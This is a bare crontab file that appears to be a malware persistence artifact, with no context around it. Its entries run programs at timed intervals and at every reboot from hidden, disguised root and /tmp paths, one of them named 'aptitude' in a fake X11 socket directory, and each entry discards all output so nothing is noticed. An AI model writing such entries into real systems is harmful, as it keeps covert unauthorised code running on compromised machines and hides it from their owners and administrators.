1 1 */2 * * /root/.configrc/a/upd>/dev/null 2>&1
@reboot /root/.configrc/a/upd>/dev/null 2>&1
5 8 * * 0 /root/.configrc/b/sync>/dev/null 2>&1
@reboot /root/.configrc/b/sync>/dev/null 2>&1  
0 0 */3 * * /tmp/.X25-unix/c/aptitude>/dev/null 2>&1
